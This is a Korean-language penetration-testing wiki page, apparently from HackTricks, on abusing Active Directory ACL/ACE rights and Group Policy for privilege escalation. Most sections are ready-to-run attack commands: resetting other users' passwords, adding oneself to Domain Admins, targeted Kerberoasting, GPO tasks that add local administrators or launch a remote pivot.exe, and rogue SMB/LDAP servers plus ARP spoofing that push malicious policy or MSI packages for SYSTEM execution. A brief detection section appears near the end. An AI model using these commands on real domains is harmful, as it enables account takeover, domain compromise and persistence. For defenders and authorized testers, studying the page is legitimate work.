# Active Directory ACL/ACE 악용

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **의 기법을 요약한 내용입니다. 자세한 내용은 원문을 확인하세요.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **사용자에 대한 GenericAll 권한**

이 권한을 통해 공격자는 대상 사용자 계정을 완전히 제어할 수 있습니다. `Get-ObjectAcl` 명령을 사용해 `GenericAll` 권한이 있는지 확인한 후 공격자는 다음을 수행할 수 있습니다.

- **대상 사용자의 비밀번호 변경**: `net user <username> <password> /domain`을 사용해 사용자의 비밀번호를 재설정할 수 있습니다.
- Linux에서는 Samba `net rpc`를 사용해 SAMR로 동일한 작업을 수행할 수 있습니다.<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **계정이 비활성화된 경우 UAC 플래그를 지우기**: `GenericAll`을 사용하면 `userAccountControl`을 편집할 수 있습니다. Linux에서 BloodyAD를 사용해 `ACCOUNTDISABLE` 플래그를 제거할 수 있습니다:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: 사용자의 계정에 SPN을 할당해 kerberoastable 상태로 만든 다음, Rubeus와 targetedKerberoast.py를 사용해 ticket-granting ticket (TGT) 해시를 추출하고 크랙을 시도합니다.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: 사용자의 pre-authentication을 비활성화하여 해당 계정을 ASREPRoasting에 취약하게 만듭니다.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: 사용자에게 `GenericAll` 권한이 있으면 인증서 기반 자격 증명을 추가해 비밀번호를 변경하지 않고도 해당 사용자로 인증할 수 있습니다. 자세한 내용은 다음을 참조하세요.

{{#ref}}
shadow-credentials.md
{{#endref}}

## **그룹에 대한 GenericAll 권한**

이 권한을 가진 공격자는 `Domain Admins`와 같은 그룹에 `GenericAll` 권한이 있을 경우 그룹 구성원을 조작할 수 있습니다. `Get-NetGroup`으로 그룹의 고유 이름을 확인한 뒤 다음을 수행할 수 있습니다.

- **자신을 Domain Admins 그룹에 추가**: 직접 명령을 사용하거나 Active Directory 또는 PowerSploit 같은 모듈을 사용할 수 있습니다.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux에서도 해당 그룹에 대한 GenericAll/Write membership 권한이 있으면 BloodyAD를 활용해 임의의 그룹에 자신을 추가할 수 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있다면, 해당 그룹을 적용하는 호스트에 즉시 WinRM 액세스 권한을 얻게 됩니다:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **Computer/User에 대한 GenericAll / GenericWrite / Write**

컴퓨터 객체 또는 사용자 계정에 이러한 권한이 있으면 다음 작업을 수행할 수 있습니다.

- **Kerberos Resource-based Constrained Delegation**: 컴퓨터 객체를 탈취할 수 있습니다.
- **Shadow Credentials**: Shadow Credentials를 생성할 수 있는 권한을 악용해 컴퓨터 또는 사용자 계정을 사칭할 수 있습니다.

## 상속된 OU 권한이 적용되는 위치로 객체 이동

계정에 대한 **이동 권한**과 대상 OU에서 상속되는 **쓰기 권한**을 결합하면, 어느 주체도 처음에는 계정의 민감한 특성을 수정할 수 없는 경우에도 경로를 만들 수 있습니다. 원본 객체의 이동 권한과 대상의 `CreateChild` 권한을 확인한 다음 객체를 이동하고, 적용되는 DACL을 다시 확인하세요. 예를 들어, powerview.py의 `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` 명령으로 사용자를 이동할 수 있습니다. 그러면 해당 OU에 상속된 `GenericWrite` 권한이 있는 제어 가능한 그룹이 [shadow credential](shadow-credentials.md)을 추가할 수 있습니다. 이동 자체가 상속 권한을 생성하는 것은 아닙니다.<sup>[[18]](#references)</sup>

OU에 `GenericAll` 권한이 있지만 적절한 상속 ACE가 없다면, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>`를 사용해 하위 객체에 적용되는 ACE를 추가할 수 있습니다. 대상 계정은 별도로 확인하세요. **AdminSDHolder로 보호되는 계정은 상속이 비활성화되어 있으므로**, OU ACE가 일반 사용자에게는 적용되더라도 보호된 사용자에게는 적용되지 않을 수 있습니다. [AdminSDHolder와 SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group)를 참조하세요.<sup>[[18]](#references)</sup>

또 다른 악용 경로는 권한이 높은 예약된 정리 스크립트가 공격자가 영향을 줄 수 있는 ACE를 바탕으로 OU를 선택한 뒤, 하위 객체에 `Set-ADObject -Clear adminCount` **및** `$acl.SetAccessRuleProtection($False, $False)`를 실행하는 경우입니다. OU DACL을 수정할 수 있다면, 스크립트가 확인하는 그룹에 필요한 `ExtendedRight` 또는 `GenericAll` ACE를 부여하세요. 작업을 실행할 수 있는 권한도 별도로 확인해야 합니다. 그러면 권한이 높은 작업이 이전에 보호된 계정의 상속을 다시 활성화해 OU ACE가 적용되도록 할 수 있습니다. 정확한 스크립트, 트리거 권한, 결과 DACL을 확인하세요. `adminCount`만 지워서는 상속이 다시 활성화되지 않으며, 보호 그룹에 남아 있는 계정은 SDProp에 의해 다시 보호될 수 있습니다.<sup>[[18]](#references)</sup>

## **Group에 대한 WriteProperty**

사용자에게 특정 그룹(예: `Domain Admins`)의 모든 객체에 대한 `WriteProperty` 권한이 있으면 다음 작업을 수행할 수 있습니다.

- **자신을 Domain Admins 그룹에 추가**: `net user`와 `Add-NetGroupUser` 명령을 결합해 도메인 내 권한을 상승시킬 수 있습니다.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **그룹의 Self (Self-Membership)**

이 권한을 통해 공격자는 그룹 멤버십을 직접 조작하는 명령을 사용해 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있습니다. 다음 명령 시퀀스를 사용하면 자신을 그룹에 추가할 수 있습니다:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (자기 구성원 추가)**

이와 유사한 권한으로, 공격자는 해당 그룹에 `WriteProperty` 권한이 있으면 그룹 속성을 수정해 자신을 그룹에 직접 추가할 수 있습니다. 이 권한의 확인과 실행은 다음과 같이 수행합니다:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

사용자에 대해 `User-Force-Change-Password`의 `ExtendedRight`를 보유하면 현재 비밀번호를 몰라도 비밀번호를 재설정할 수 있습니다. 이 권한의 확인과 악용은 PowerShell 또는 다른 명령줄 도구를 통해 수행할 수 있으며, 대화형 세션과 비대화형 환경에서 사용하는 원라이너를 포함해 사용자의 비밀번호를 재설정하는 여러 방법이 있습니다. 명령어는 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 방법까지 다양하며, 공격 벡터의 유연성을 보여 줍니다.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **그룹의 WriteOwner**

공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있음을 확인하면, 그룹의 소유자를 자신으로 변경할 수 있습니다. 해당 그룹이 `Domain Admins`인 경우, 소유권을 변경하면 그룹 속성과 멤버십을 더 광범위하게 제어할 수 있어 특히 큰 영향을 미칩니다. 이 과정에서는 `Get-ObjectAcl`을 사용해 올바른 개체를 식별한 다음, SID 또는 이름을 지정해 `Set-DomainObjectOwner`로 소유자를 변경합니다.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **사용자에 대한 GenericWrite**

이 권한을 사용하면 공격자가 사용자 속성을 수정할 수 있습니다. 특히 `GenericWrite` 액세스 권한이 있으면, 공격자는 사용자가 로그온할 때 악성 스크립트가 실행되도록 사용자의 로그온 스크립트 경로를 변경할 수 있습니다. 이는 `Set-ADObject` 명령을 사용해 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트하는 방식으로 이루어집니다.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

사용자의 [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)에 범위가 제한된 `WriteProperty` ACE만으로도 충분할 수 있으며, `GenericWrite`는 필요하지 않습니다. 해당 attribute 권한을 도메인의 `SYSVOL\<domain>\scripts` 또는 `NETLOGON` 트리 아래의 쓰기 가능한 스크립트와 함께 사용한 다음, 대상 사용자가 로그온하여 스크립트에 도달할 가능성이 있는지 평가하세요. 스크립트는 로그온 시 해당 사용자의 컨텍스트에서 실행됩니다. 유효한 AD ACL과 파일/공유 ACL을 각각 검토하세요. 일치하는 Allow ACE나 쓰기 가능한 디렉터리만으로는 전체 경로가 성립한다고 볼 수 없습니다.

## **GenericWrite on Group**

이 권한이 있으면 공격자는 그룹 멤버십을 조작할 수 있습니다. 예를 들어, 자신이나 다른 사용자를 특정 그룹에 추가할 수 있습니다. 이 과정에는 자격 증명 객체를 만들고, 이를 사용해 그룹에 사용자를 추가하거나 제거한 뒤, PowerShell 명령으로 멤버십 변경을 확인하는 작업이 포함됩니다.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux에서 그룹에 대한 `GenericWrite` 권한이 있으면 Samba `net`을 사용해 구성원을 추가하거나 제거할 수 있습니다(PowerShell/RSAT을 사용할 수 없을 때 유용합니다):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD 객체의 소유자이고 해당 객체에 대한 `WriteDACL` 권한이 있으면 공격자는 자신에게 객체에 대한 `GenericAll` 권한을 부여할 수 있습니다. 이는 ADSI 조작을 통해 이루어지며, 객체를 완전히 제어하고 그룹 멤버십을 수정할 수 있게 됩니다. 하지만 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용해 이 권한을 악용하려 할 때는 제약이 있습니다.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner 빠른 장악 (PowerView)

사용자 계정이나 서비스 계정에 대해 `WriteOwner` 및 `WriteDacl` 권한이 있으면, 이전 비밀번호를 몰라도 PowerView를 사용해 계정을 완전히 제어하고 비밀번호를 재설정할 수 있습니다:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes:
- `WriteOwner`만 있다면 먼저 소유자를 자신으로 변경해야 할 수 있습니다:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- 비밀번호를 재설정한 후 모든 프로토콜(SMB/LDAP/RDP/WinRM)을 사용해 접근을 확인합니다.

## **도메인 복제 (DCSync)**

DCSync 공격은 도메인의 특정 복제 권한을 악용해 Domain Controller를 모방하고 사용자 자격 증명을 포함한 데이터를 동기화합니다. 이 강력한 기법을 사용하려면 `DS-Replication-Get-Changes`와 같은 권한이 필요하며, 공격자는 이를 통해 Domain Controller에 직접 접근하지 않고도 AD 환경에서 민감한 정보를 추출할 수 있습니다.<sup>[[5]](#references)</sup> [**DCSync 공격에 대해 자세히 알아보세요.**](../dcsync.md)

## GPO 위임 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 위임

Group Policy Objects(GPO)를 관리할 수 있도록 위임된 접근 권한은 상당한 보안 위험을 초래할 수 있습니다. 예를 들어, `offense\spotless`와 같은 사용자에게 GPO 관리 권한이 위임된 경우 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 권한을 가질 수 있습니다. 이러한 권한은 악의적인 목적으로 악용될 수 있으며, PowerView를 사용해 다음과 같이 확인할 수 있습니다. `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO 권한 열거

잘못 구성된 GPO를 식별하려면 PowerSploit의 cmdlet을 연결해 사용할 수 있습니다. 이렇게 하면 특정 사용자가 관리 권한을 가진 GPO를 찾을 수 있습니다. `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**특정 정책이 적용된 컴퓨터**: 특정 GPO가 적용되는 컴퓨터를 확인하면 잠재적 영향 범위를 파악하는 데 도움이 됩니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 어떤 정책이 적용되는지 확인하려면 `Get-DomainGPO`와 같은 명령을 사용할 수 있습니다.

**특정 정책이 적용된 OU**: `Get-DomainOU`를 사용하면 특정 정책의 영향을 받는 조직 구성 단위(OU)를 식별할 수 있습니다.

도구 [**GPOHound**](https://github.com/cogiceo/GPOHound)를 사용해 GPO를 열거하고 문제를 찾을 수도 있습니다.

### GPO 악용 - New-GPOImmediateTask

잘못 구성된 GPO를 악용하면 코드를 실행할 수 있습니다. 예를 들어, 즉시 실행되는 예약 작업을 생성할 수 있습니다. 이를 통해 영향을 받는 컴퓨터의 로컬 administrators 그룹에 사용자를 추가하여 권한을 크게 높일 수 있습니다.

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - GPO 악용

GroupPolicy module이 설치되어 있으면 새 GPO를 만들고 연결할 수 있으며, 영향을 받는 컴퓨터에서 backdoors를 실행하도록 레지스트리 값과 같은 기본 설정을 지정할 수 있습니다. 이 방법을 사용하려면 GPO를 업데이트하고 사용자가 해당 컴퓨터에 로그인해야 실행됩니다:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPO 악용

SharpGPOAbuse는 새 GPO를 만들지 않고 작업을 추가하거나 설정을 수정하여 기존 GPO를 악용하는 방법을 제공합니다. 이 도구를 사용하려면 변경 사항을 적용하기 전에 기존 GPO를 수정하거나 RSAT 도구를 사용해 새 GPO를 만들어야 합니다:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### 정책 강제 업데이트

GPO는 일반적으로 약 90분마다 업데이트됩니다. 이 과정을 앞당기려면, 특히 변경 사항을 적용한 직후 대상 컴퓨터에서 `gpupdate /force` 명령을 사용해 정책을 즉시 업데이트할 수 있습니다. 이 명령을 사용하면 다음 자동 업데이트 주기를 기다리지 않고 GPO의 변경 사항을 적용할 수 있습니다.

### 내부 동작

`Misconfigured Policy`와 같은 특정 GPO의 Scheduled Tasks를 살펴보면 `evilTask` 같은 작업이 추가되었는지 확인할 수 있습니다. 이러한 작업은 시스템 동작을 변경하거나 권한을 상승시키려는 스크립트나 명령줄 도구를 통해 생성됩니다.

`New-GPOImmediateTask`가 생성한 XML 구성 파일에 나타난 작업 구조에는 실행할 명령과 트리거를 비롯한 예약 작업의 세부 정보가 포함됩니다. 이 파일은 GPO에서 예약 작업을 정의하고 관리하는 방식을 보여주며, 정책 적용의 일부로 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.

### 사용자 및 그룹

GPO를 사용하면 대상 시스템의 사용자 및 그룹 구성원 자격도 조작할 수 있습니다. 공격자는 Users and Groups 정책 파일을 직접 편집해 사용자를 로컬 `administrators` 그룹과 같은 권한 있는 그룹에 추가할 수 있습니다. GPO 관리 권한을 위임하면 정책 파일을 수정해 사용자를 추가하거나 그룹 구성원 자격을 변경할 수 있습니다.

Users and Groups의 XML 구성 파일에는 이러한 변경 사항을 적용하는 방법이 정의되어 있습니다. 이 파일에 항목을 추가하면 영향을 받는 시스템에서 특정 사용자에게 상승된 권한을 부여할 수 있습니다. 이 방법은 GPO 조작을 통해 권한을 직접 상승시키는 수단입니다.

로컬 그룹 구성원 자격 및 사용자 권한과 같은 보안 설정의 경우, 적용된 GPO 템플릿인 `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`와 `SecEdit` 디렉터리의 ACL도 확인하세요. 디렉터리나 파일에 쓰기 권한이 있다는 사실은 추가 검토가 필요하다는 신호입니다. 실제 변경 적용 여부는 유효한 SYSVOL 공유 접근 권한, 거부 및 상속 ACL, Group Policy 컨테이너 권한, 정책 범위, 클라이언트 새로 고침에 따라 달라집니다. “GPO Managers”라는 그룹의 구성원이라는 사실만으로는 편집 권한이 확인되지 않습니다. [Microsoft 문서에서는 이 템플릿 경로와 Group Policy 컨테이너/템플릿의 분리를 설명합니다.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

또한 로그온/로그오프 스크립트 활용, 자동 실행을 위한 레지스트리 키 수정, .msi 파일을 통한 소프트웨어 설치, 서비스 구성 편집 등 코드 실행이나 지속성 유지에 사용할 수 있는 추가 방법도 고려할 수 있습니다. 이러한 기법은 GPO 악용을 통해 접근을 유지하고 대상 시스템을 제어하는 여러 방법을 제공합니다.

### 인증된 악성 서비스로 GPC/GPT 검색 리디렉션

GPO는 메타데이터를 포함하는 LDAP **Group Policy Container (GPC)**와 정책 파일을 호스팅하는 SMB 기반 **Group Policy Template (GPT)**로 구성됩니다. 새로 고침 과정에서 클라이언트는 컨테이너의 `gPLink`를 따라 참조된 GPC와 해당 `gPCFileSysPath`를 읽은 다음, 그 UNC 경로에서 GPT를 다운로드합니다. 따라서 GPC 자체 또는 OU, Site, Domain의 `gPLink`에 대한 쓰기 권한을 이용해 권한 있는 정책 처리를 유도할 수 있습니다.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity를 이용한 `gPCFileSysPath` 변조

제어 중인 주체가 대상 GPC에 직접 쓰거나 **NTLM relay to LDAP**를 통해 쓸 수 있다면, `gPCFileSysPath`를 공격자가 호스팅하는 UNC 경로로 바꿉니다. [GPOddity](https://github.com/synacktiv/GPOddity)는 LDAP 변경을 자동화하고, 모듈 기반 정책 파일이나 Group Policy 클라이언트가 `NT AUTHORITY\SYSTEM`으로 실행하는 Immediate Task가 포함된 악성 GPT를 제공합니다.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

현재 Windows 클라이언트에서는 익명 SMB 공유나 자격 증명을 확인하지 않는 SMB 공유만으로는 충분하지 않습니다. SMB Secure Negotiate는 인증에 성공했다는 증명을 요구하므로, 악성 서비스는 도메인 ID를 검증하고 SMB 세션 키를 도출한 뒤 응답에 올바르게 서명해야 합니다. 임베디드 모드에서는 제어 가능한 컴퓨터 계정과 해당 서비스 키를 사용하도록 GPOddity를 구성한 다음, `[COMMANDS]` 섹션에서 컴퓨터 측 또는 사용자 측 페이로드를 선택합니다.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**사용자 GPO 엣지 케이스:** MS16-072 이후에도 Windows는 **동일한 TCP 연결에서** 두 개의 SMB2 세션을 생성합니다. 사용자 세션은 `GPT.INI`를 읽고, 컴퓨터 계정 세션은 `ScheduledTasks.xml`과 같은 유효한 구성을 읽습니다. 따라서 공격자가 제어하는 서버는 인증 상태, 세션 키, 서명 키를 소켓만이 아니라 SMB2 `SessionId`별로 인덱싱해야 합니다. GPOddity/OUned에 내장된 Scapy 포크는 `SMBStreamSocketMultiplexing`과 멀티플렉싱을 지원하는 `SMBServer`를 통해 이를 구현합니다. 단일 세션만 처리하는 Impacket/Scapy 서버는 그렇지 않으면 잘못된 서명 상태를 재사용해 사용자 정책 처리에 실패합니다.<sup>[[15]](#references)</sup>

#### OUned를 이용한 `gPLink` 포이즈닝

OU, Site 또는 Domain에 대해 `WriteGPLink`, `GenericWrite` 또는 이에 준하는 제어 권한이 있는 공격자는 공격자가 제어하는 LDAP 호스트에서 제공되는 GPC DN을 가리키는 링크를 추가할 수 있습니다. 이 기법은 Petros Koutroumpis가 처음 소개했으며, [OUned](https://github.com/synacktiv/OUned)는 LDAP 쓰기와 악성 GPC/GPT 체인 구성을 자동화합니다.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

피해자는 먼저 rogue LDAP 서비스에 인증하고 `gPCFileSysPath`가 rogue SMB 서비스를 가리키는 GPC를 받습니다. 그런 다음 SMB에 인증하고 제공된 GPT를 적용합니다. 따라서 OUned에는 LDAP SPN이 있는 계정과 SMB용 HOST SPN이 있는 머신 계정(동일한 머신 계정으로 둘 다 충족 가능), 그리고 포트 389와 445의 트래픽을 operator 호스트로 전달하는 DNS 확인 또는 역방향 포워딩이 필요합니다.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned에 내장된 Scapy LDAP server는 실제로 제어 중인 service key로 Kerberos/SPNEGO를 검증하고 JSON에서 임의의 GPC 데이터를 제공합니다. 빈 JSON key는 rootDSE를 나타내며, `base64:` 접두사는 바이너리 값을 나타냅니다. 이 server는 add/delete/modify/search와 `BASE`, `LEVEL`, `SUBTREE` 검색을 지원하며, 보호 없음, 무결성 또는 기밀성으로 협상할 수 있습니다. 따라서 다른 Windows 구성 요소가 attacker-controlled LDAP 참조를 따르면서 인증된 LDAP를 요구하는 경우 이 service를 재사용할 수 있습니다.<sup>[[15]](#references)</sup>

계정 password를 더미 도메인에 동기화하면 모든 Kerberos key가 재현된다고 가정하지 마세요. RC4는 password에서 파생되지만, AES string-to-key는 principal의 hostname/domain에서 파생된 salt도 사용합니다. 실제 계정 AES key를 `KerberosSSP`에 제공하면 machine account의 자체 쓰기 가능 속성인 `msDS-SupportedEncryptionTypes`를 탐지 가능한 방식으로 변경해 RC4를 강제하지 않아도 됩니다.<sup>[[15]](#references)</sup>

#### 탐지 포인트

`gPCFileSysPath` 또는 `gPLink` 변경 사항을 GPO 버전 변경 및 새로운 Immediate/Scheduled Task XML과 연관 지어 분석하세요. 예상치 못한 naming context, 승인된 DC/SYSVOL 집합 밖의 UNC host, machine-account 이름을 재지정하는 DNS record, 비정상적인 machine account의 LDAP/CIFS service ticket, RC4를 활성화하는 `msDS-SupportedEncryptionTypes` 변경을 조사하세요.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain에 대한 `WriteGPLink` 권한이 있으면 대상 컨테이너의 `gPLink` 속성을 수정해 GPO 자체를 편집하지 않고도 **기존 GPO를 적용하도록 강제**할 수 있습니다. 연결된 GPO가 이미 **UNC path**(`\\HOST\share\...`)를 통해 원격 콘텐츠를 참조한다면 특히 유용합니다. 인증된 사용자는 **SYSVOL**을 읽을 수 있으므로 오프라인에서 재사용 가능한 정책을 찾을 수 있습니다.<sup>[[11]](#references)</sup>

상위 수준의 작업 흐름:

1. BloodHound를 사용해 OU에 대한 `WriteGPLink` 권한이 있는 principal을 식별하고 해당 OU 안의 computer/user를 열거합니다.
2. `SYSVOL`을 읽기 전용으로 복제하고 GPO를 분석해 UNC path를 참조하는 **Software Installation**, **drive mappings**(`Drives.xml`), **logon/startup scripts**를 찾습니다.
3. DFS/domain-namespace path보다 **직접 hostname**을 가리키는 정책(예: `\\DC02\share\pkg.msi`)을 우선합니다. hostname 기반 path는 L2 spoofing으로 재지정하기가 더 쉽기 때문입니다.
4. 선택한 GPO GUID를 대상 OU의 `gPLink`에 추가해 victim이 해당 기존 정책을 처리하도록 합니다.
5. 같은 broadcast domain에서 UNC host를 ARP spoof하고 해당 IP를 로컬에 바인딩합니다(`ip addr add <target_ip>/32 dev <iface>`). 이렇게 하면 victim의 SMB traffic이 공격자 host에 도달합니다.
6. 공격자 SMB server(예: `smbserver.py`)에서 예상 경로/파일명을 제공하고 정상적인 정책 처리를 기다립니다.

`SYSVOL` 수집 및 GPO 상관 분석 예시:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

기존 GPO를 대상 OU에 연결합니다:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

연결된 GPO가 UNC 경로에서 MSI를 배포하는 경우, 클라이언트는 **컴퓨터 시작 시** 해당 MSI를 가져와 **`NT AUTHORITY\SYSTEM`** 권한으로 설치합니다. 참조된 호스트를 스푸핑하고 **동일한 공유 경로와 파일 이름**으로 악성 MSI를 제공하면, **SYSVOL을 수정하지 않고도** `WriteGPLink`를 SYSTEM 권한 코드 실행으로 이어지게 할 수 있습니다.

중요한 제약 사항:

- **타이밍이 중요합니다**: 새 링크는 정책을 새로 고칠 때 적용됩니다(일반적으로 약 90분 소요). 하지만 **Software Installation**은 보통 **재부팅할 때** 실행됩니다.
- Windows Installer는 일반적으로 배포를 추적할 때 패키지의 **`ProductCode`**를 사용합니다. 제품이 이미 설치되어 있으면 배포가 건너뛰어질 수 있습니다.
- 설치 프로그램이 거부하지 않도록, 악성 MSI를 패치해 해당 MSI의 **`ProductCode`**와 **`PackageCode`**가 GPO에서 요구하는 정식 패키지의 값과 일치하게 합니다.
